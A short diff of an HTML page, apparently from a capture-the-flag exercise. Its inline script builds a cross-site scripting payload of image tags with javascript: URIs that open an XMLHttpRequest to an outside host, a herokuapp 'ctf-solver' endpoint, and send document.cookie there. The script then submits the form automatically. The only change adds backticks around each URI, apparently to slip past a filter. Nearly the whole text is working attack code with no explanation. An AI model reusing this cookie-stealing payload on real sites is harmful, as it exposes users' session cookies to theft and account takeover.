@@ -10,7 +10,7 @@
 <script>
 var open='<'+'ig src=';
 var close='></'+'img'+'>';
-document.getElementById('m').value=open+"javascript:var xhr=new XMLHttpRequest()"+close+open+"javascript:xhr.open('POST','https://www.ctf-solver.herokuapp.com/image',true)"+close+open+"javascript:xhr.send(document.cookie)"+close;
+document.getElementById('m').value=open+"`javascript:var xhr=new XMLHttpRequest()`"+close+open+"`javascript:xhr.open('POST','https://www.ctf-solver.herokuapp.com/image',true)`"+close+open+"`javascript:xhr.send(document.cookie)`"+close;
 document.getElementById('s').click();
 </script>
 <noscript>You're missing out.</noscript>
